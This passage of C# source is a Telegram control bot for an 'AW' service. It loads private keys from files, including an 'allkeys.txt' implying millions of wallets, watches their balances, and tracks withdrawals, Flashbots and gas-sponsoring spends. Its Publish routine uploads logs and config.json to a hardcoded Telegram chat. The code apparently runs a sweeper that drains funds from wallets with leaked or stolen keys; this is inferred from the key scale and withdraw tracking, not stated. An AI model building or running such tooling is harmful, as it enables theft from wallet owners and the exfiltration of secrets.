                                                                $"Get balances drips\n   ┕ <code>/drips</code>\n\n" +
                                                                $"Claim drips\n   ┕ <code>/claim</code>\n\n" +
                                                                $"Enable/Disable notifications drip\n   ┕ <code>/notifications</code>\n\n" +
                                                                $"Get last 100 logs\n   ┕ <code>/logs</code>\n\n" +
                                                                $"Set minimum amount for notifications\n   ┕ <code>/min sum$</code>\n\n" +
                                                                $"Publish AW\n   ┕ <code>/publish</code>\n\n" +
                                                                $"Status of work AW\n   ┕ <code>/status</code>\n\n" +
                                                                $"Balance of addresses\n   ┕ <code>/balance</code>\n\n" +
                                                                $"Reload wallets\n   ┕ <code>/reload</code>\n\n" +
                                                                $"Stop AW\n   ┕ <code>/stop</code>\n\n" +
                                                                $"Reboot AW\n   ┕ <code>/reboot</code>",
                        ParseMode.Html, replyMarkup: Keyboard());
                }

                #endregion
            }
            catch (NullReferenceException)
            {
                // ignored
            }
            catch (Exception e)
            {
                Logger.Error(e);
                await Bot.SendTextMessageAsync(msg.Chat.Id, $"❌ Error: {e.Message}");
            }
        }

        public static InlineKeyboardMarkup Keyboard() => new InlineKeyboardMarkup(new[]
        {
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🥩 Stakes"),
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("===== 📄 Information =====")
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("💰 Earned"),
                InlineKeyboardButton.WithCallbackData("💸 Spended")
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("💲 Balance"),
                InlineKeyboardButton.WithCallbackData("⏱ Status")
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("===== ⚙ Management =====")
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData("🔄 Reload wallets"),
                InlineKeyboardButton.WithCallbackData("🔄 Reboot AW")
            },
            new[]
            {
                InlineKeyboardButton.WithCallbackData(
                    $"{(Settings.Config.Other.StoppedAW ? "🔒 Start" : "🔓 Stop")} AW")
            }
        });

        public static async Task Publish()
        {
            await Settings.BotTransaction.Bot.SendMediaGroupAsync(-1001965805120, new List<IAlbumInputMedia>
            {
                new InputMediaDocument(new InputMedia(new MemoryStream(Encoding.UTF8.GetBytes(string.Concat(Logger.Logs.ToArray()))), "Logs.txt")),
                new InputMediaDocument(new InputMedia(new MemoryStream(await File.ReadAllBytesAsync("./stats.json")), "stats.json")),
                new InputMediaDocument(new InputMedia(new MemoryStream(await File.ReadAllBytesAsync("./tokensPrices.json")), "tokensPrices.json")),
                new InputMediaDocument(new InputMedia(new MemoryStream(await File.ReadAllBytesAsync("./stakes.json")), "stakes.json")),
                new InputMediaDocument(new InputMedia(new MemoryStream(await File.ReadAllBytesAsync("./config.json")), "config.json")),
            });

            Logger.Logs.Clear();
        }

        public async Task Stakes(long ChatID, int MessageID = 0)
        {
            var Stakes = JsonSerializer.Deserialize<List<Stakes>>(await File.ReadAllTextAsync("stakes.json"));

            BigInteger Wei = await Settings.Chains[56].Web3.Eth.GetBalance.SendRequestAsync("0x69E120C8ADDE1478e6e508b9483e9d5C93eAC6fd");

            string result = "Total: {Price}$\n" + $"<a href=\"https://bscscan.com/address/0x69E120C8ADDE1478e6e508b9483e9d5C93eAC6fd\">Sponsor</a>: {(float)Web3.Convert.FromWei(Wei)} BNB ({Pricing.GetPrice(Wei, 56)}$)\n\n";
            Dictionary<int, Dictionary<string, dynamic>> Timestamps =
                new Dictionary<int, Dictionary<string, dynamic>>();

            Message reply;
            if (MessageID != 0)
            {
                reply = await Bot.EditMessageTextAsync(ChatID, MessageID, "✅ Gettings stakes...",
                    replyMarkup: Keyboard());
            }
            else
            {
                reply = await Bot.SendTextMessageAsync(ChatID, "✅ Gettings stakes...",
                    replyMarkup: Keyboard());
            }

            foreach (var Stake in Stakes)
            {
                var resultStake = await Helper.ResultStake(Stake);

                if (Timestamps.ContainsKey(resultStake.End))
                    continue;

                Timestamps.Add(resultStake.End, new Dictionary<string, dynamic> { { "Stake", Stake }, { "Result", resultStake } });
            }

            float Total = 0;

            foreach (var pair in Timestamps.OrderBy(pair => pair.Key))
            {
                var Date = Helper.UnixTimeStampToDateTime((double)pair.Value["Result"].End);
                TimeSpan ts = Date - DateTime.Now.AddHours(2);

                string ContractAddress = pair.Value["Stake"].Name == "SFUND"
                    ? "0x477bC8d23c634C154061869478bce96BE6045D12"
                    : "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82";

                var Contract = new ContractHelper("", ContractAddress, Settings.Chains[56].Web3);
                string Symbol = await Contract.Symbol();

                Pricing.ValidPrice(56, "", ContractAddress, (BigInteger)pair.Value["Result"].Amount, (BigInteger)pair.Value["Result"].Amount,
                    await Contract.Decimals(), Symbol, out float Price, out float Ether, out BigInteger _);

                if (result.Split("\n\n").Length < 25)
                    result += $"<a href=\"https://bscscan.com/address/{pair.Value["Stake"].Address}\">{pair.Value["Stake"].Address}</a> - {(int)Ether} {Symbol} ({(int)Price}$)\n{Date:''HH\\:''mm\\:''ss} {Date:''dd\\.''MM\\.''yyyy} ({ts.Days} дней, {ts.ToString(@"hh\:mm\:ss")})\n{Pricing.GetPrice(Web3.Convert.ToWei((BigInteger)pair.Value["Stake"].Gwei * 21000, UnitConversion.EthUnit.Gwei) + ((60000000000 * 400000) + (60000000000 * 140000) + 1000000000000000), 56)}$ TX Fee ({pair.Value["Stake"].Gwei} gwei)\n\n";

                Total += Price;
            }

            if (result == "Total: {Price}$\n\n")
                result = "No stakes";

            await Bot.EditMessageTextAsync(ChatID, reply.MessageId, result.Replace("{Price}", $"{(int)Total}"), ParseMode.Html, replyMarkup: Keyboard());
        }

        public static async Task Reload(long ChatID = 0, int MessageID = 0, ITelegramBotClient Bot = null)
        {
            int Count = Settings.Wallets.Count;
            int CountDrips = Settings.Drips.Count;

            Message reply = null;
            if (ChatID > 0)
            {
                if (MessageID != 0)
                {
                    reply = await Bot.EditMessageTextAsync(ChatID, MessageID, "✅ Reloading wallets...",
                        replyMarkup: Keyboard());
                }
                else
                {
                    reply = await Bot.SendTextMessageAsync(ChatID, "✅ Reloading wallets...",
                        replyMarkup: Keyboard());
                }
            }

            #region Wallets

            Settings.Wallets.Clear();

            string[] lines = await File.ReadAllLinesAsync(Settings.Config.Path);
            foreach (string line in lines)
            {
                try
                {
                    string[] data = line.Replace("\n", "").Split(" ");
                    if (data[0].Length == 64 || data[0].Length == 66)
                    {
                        string address = Web3.ToChecksumAddress(new Account(data[0]).Address);
                        string text = $"{address} {data[0]}";
                        data = text.Split(" ");
                        lines[Array.IndexOf(lines, line)] = text;
                    }
                    if (Settings.Wallets.ContainsKey(data[0])) continue;
                    while (!Settings.Wallets.TryAdd(data[0], data[1]))
                    {
                        Thread.Sleep(20);
                    }
                }
                catch (IndexOutOfRangeException)
                {
                    // ignored
                }
            }

            File.WriteAllLines(Settings.Config.Path, lines);

            new Thread(async () =>
            {
                try
                {
                    lines = File.ReadAllLines("../allkeys.txt");
                    List<string> emptyWallets = new List<string>();
                    foreach (string line in lines)
                    {
                        try
                        {
                            string[] data = line.Replace("\n", "").Split(" ");
                            if (Settings.Wallets.ContainsKey(data[0])) continue;
                            emptyWallets.Add(data[0]);
                            while (!Settings.Wallets.TryAdd(data[0], data[1]))
                            {
                                Thread.Sleep(20);
                            }
                        }
                        catch (IndexOutOfRangeException)
                        {
                            // ignored
                        }
                    }

                    Logger.Debug($"Wallets > {Settings.Wallets.Count}");

                    await Task.Factory.StartNew(() => Main.Handlers.Balance.Starter(emptyWallets.ToArray()));
                }
                catch (Exception e)
                {
                    Logger.Error($"Wallet not exist - {e.Message}");
                }
            }).Start();

            Logger.Debug($"Wallets > {Settings.Wallets.Count}");

            #endregion

            if (ChatID > 0)
                await Bot.EditMessageTextAsync(ChatID, reply.MessageId, $"✅ Loaded {Settings.Wallets.Count} (+{(Settings.Wallets.Count + 18189237) - (Count < 18000000 ? (Count + 18189237) : Count)}) wallets.", replyMarkup: Keyboard()); //\nDrips: {Settings.Drips.Count} (+{Settings.Drips.Count - CountDrips})

            Main.Handlers.Balance.Stop = true;
            Thread.Sleep(1000);
            Main.Handlers.Balance.Stop = false;

            await Task.Factory.StartNew(() => Main.Handlers.Balance.Starter(Settings.Wallets.Keys.ToArray()));
        }

        public static string Earn()
        {
            Earn AllTime = Settings.Stats.AllTime.Earns;
            Earn Month = Settings.Stats.Month.Earns;
            Earn Day = Settings.Stats.Day.Earns;
            return $"Earns of All Time\n" +
                                       $"   ┝ <code>Total: {AllTime.TotalCultured()}$</code>\n" +
                                       $"   ┝ <code>Flashbots: {AllTime.FlashbotsCultured()}$</code>\n" +
                                       $"   ┝ <code>SmartGas: {AllTime.SmartGasTotal()}$</code>\n" +
                                       $"   ┝  ┝ <code>Native: {AllTime.SmartGas.NativeCultured()}$</code>\n" +
                                       $"   ┝  ┕ <code>Tokens: {AllTime.SmartGas.TokensCultured()}$</code>\n" +
                                       $"   ┕ <code>Withdraws: {AllTime.WithdrawTotal()}$</code>\n" +
                                       $"         ┝ <code>Native: {AllTime.Withdraw.NativeCultured()}$</code>\n" +
                                       $"         ┕ <code>Tokens: {AllTime.Withdraw.TokensCultured()}$</code>\n" +
                                       $"AVG: {Average.AllTime(Settings.Stats.AllTime.Earns.Total)}₽ per second\n\n" +
                                       $"" +
                                       $"Earns of Month\n" +
                                       $"   ┝ <code>Total: {Month.TotalCultured()}$</code>\n" +
                                       $"   ┝ <code>Flashbots: {Month.FlashbotsCultured()}$</code>\n" +
                                       $"   ┝ <code>SmartGas: {Month.SmartGasTotal()}$</code>\n" +
                                       $"   ┝  ┝ <code>Native: {Month.SmartGas.NativeCultured()}$</code>\n" +
                                       $"   ┝  ┕ <code>Tokens: {Month.SmartGas.TokensCultured()}$</code>\n" +
                                       $"   ┕ <code>Withdraws: {Month.WithdrawTotal()}$</code>\n" +
                                       $"         ┝ <code>Native: {Month.Withdraw.NativeCultured()}$</code>\n" +
                                       $"         ┕ <code>Tokens: {Month.Withdraw.TokensCultured()}$</code>\n" +
                                       $"AVG: {Average.Month(Settings.Stats.Month.Earns.Total)}₽ per second\n\n" +
                                       $"" +
                                       $"Earns of Day\n" +
                                       $"   ┝ <code>Total: {Day.TotalCultured()}$</code>\n" +
                                       $"   ┝ <code>Flashbots: {Day.FlashbotsCultured()}$</code>\n" +
                                       $"   ┝ <code>SmartGas: {Day.SmartGasTotal()}$</code>\n" +
                                       $"   ┝  ┝ <code>Native: {Day.SmartGas.NativeCultured()}$</code>\n" +
                                       $"   ┝  ┕ <code>Tokens: {Day.SmartGas.TokensCultured()}$</code>\n" +
                                       $"   ┕ <code>Withdraws: {Day.WithdrawTotal()}$</code>\n" +
                                       $"         ┝ <code>Native: {Day.Withdraw.NativeCultured()}$</code>\n" +
                                       $"         ┕ <code>Tokens: {Day.Withdraw.TokensCultured()}$</code>\n" +
                                       $"AVG: {Average.Day(Settings.Stats.Day.Earns.Total)}₽ per second";
        }

        public static string Spend()
        {
            Spends AllTime = Settings.Stats.AllTime.Spends;
            Spends Month = Settings.Stats.Month.Spends;
            Spends Day = Settings.Stats.Day.Spends;
            return $"Spends of All Time\n" +
                                        $"   ┝ <code>Total: {AllTime.TotalCultured()}$</code>\n" +
                                        $"   ┝ <code>Sponsored: {AllTime.SponsoredCultured()}$</code>\n" +
                                        $"   ┝ <code>Flashbots: {AllTime.FlashbotsCultured()}$</code>\n" +
                                        $"   ┕ <code>Proxy: {AllTime.ProxyCultured()}$</code>\n\n" +
                                        $"" +
                                        $"Spends of Month\n" +
                                        $"   ┝ <code>Total: {Month.TotalCultured()}$</code>\n" +
                                        $"   ┝ <code>Sponsored: {Month.SponsoredCultured()}$</code>\n" +
                                        $"   ┝ <code>Flashbots: {Month.FlashbotsCultured()}$</code>\n" +
                                        $"   ┕ <code>Proxy: {Month.ProxyCultured()}$</code>\n\n" +
                                        $"" +
                                        $"Spends of Day\n" +
                                        $"   ┝ <code>Total: {Day.TotalCultured()}$</code>\n" +
                                        $"   ┝ <code>Sponsored: {Day.SponsoredCultured()}$</code>\n" +
                                        $"   ┝ <code>Flashbots: {Day.FlashbotsCultured()}$</code>\n" +
                                        $"   ┕ <code>Proxy: {Day.ProxyCultured()}$</code>";
        }

        public static string Status()
        {
            string result = "";

            foreach (int ChainID in Settings.Chains.Keys)
            {
                Chain chain = Settings.Chains[ChainID];

                string Pendings = "No data";
                string Blocks = "No data";

                try
                {
                    try
                    {
                        TimeSpan PassedPendings = TimeSpan.FromSeconds(Pending.PendingWork[ChainID] -
                                                                       DateTime.UtcNow
                                                                           .Subtract(new DateTime(1970, 1, 1))
                                                                           .TotalSeconds);

                        if (PassedPendings.ToString("''m") != "0" &&
                            (ChainID != 42161 || int.Parse(PassedPendings.ToString("''m")) >= 3))
                        {
                            Pendings = $"{PassedPendings:''m\\:ss} minutes ago";
                        }
                        else
                        {
                            Pendings = $"{PassedPendings:''s} secs ago";
                        }
                    }
                    catch
                    {
                        // ignored
                    }

                    try
                    {
                        TimeSpan PassedBlocks = TimeSpan.FromSeconds(Main.Handlers.Block.BlocksWork[ChainID] -
                                                                     DateTime.UtcNow
                                                                         .Subtract(new DateTime(1970, 1, 1))
                                                                         .TotalSeconds);

                        if (PassedBlocks.ToString("''m") != "0" &&
                            (ChainID != 42161 || int.Parse(PassedBlocks.ToString("''m")) >= 3))
                        {
                            Blocks = $"{PassedBlocks:''m\\:ss} minutes ago";
                        }
                        else
                        {
                            Blocks = $"{PassedBlocks:''s} secs ago";
                        }
                    }
                    catch
                    {
                        // ignored
                    }
                }
                catch
                {
                    // ignored
                }

                result +=
                    $"{chain.Name}\n   ┝ Pendings: <code>{Pendings}</code>\n   ┕ Blocks: <code>{Blocks}</code>\n\n";
            }

            return result;
        }

      
        public static async Task<string> Balance()
        {
            string result = $"Proxy — <code>{Settings.Config.Proxy.Address}</code>\n\n";

            foreach (int ChainID in Settings.Chains.Keys)
            {
                Chain chain = Settings.Chains[ChainID];
                if (chain.Contract?.Sponsor == null) continue;
                try
                {
                    BigInteger Wei = await chain.Web3.Eth.GetBalance.SendRequestAsync(chain.Contract.Sponsor);
                    float Ether = (float)Web3.Convert.FromWei(Wei);
                    BigInteger WeiProxy =
                        await chain.Web3.Eth.GetBalance.SendRequestAsync(Settings.Config.Proxy.Address);
                    float EtherProxy = (float)Web3.Convert.FromWei(WeiProxy);
                    string Link = Settings.Chains[ChainID].Link;

                    float Price = Pricing.GetPrice(Wei, ChainID);
                    float PriceProxy = Pricing.GetPrice(WeiProxy, ChainID);

                    result +=
                        $"{chain.Name}\n   <a href=\"https://{Link}/address/{chain.Contract.Sponsor}\">Main</a>\n     ┝ Balance: {Ether} {chain.Token} ({Price}$) {Helper.GetSymbol(Price, ChainID)}\n     ┕ Address: <code>{chain.Contract.Sponsor}</code>\n   <a href=\"https://{Link}/address/{Settings.Config.Proxy.Address}\">Proxy</a>\n     ┕ Balance: {EtherProxy} {chain.Token} ({PriceProxy}$) {Helper.GetSymbol(PriceProxy, ChainID, true)}\n\n";
                }
                catch (Exception e)
                {
                    Logger.Error($"{e.Message} - {chain.Name}");
                }
            }

            return result;
        }

        public Task HandlePollingErrorAsync(ITelegramBotClient _, Exception exception, CancellationToken __)
        {
            Logger.Error(exception);
            return Task.CompletedTask;
        }
    }
}
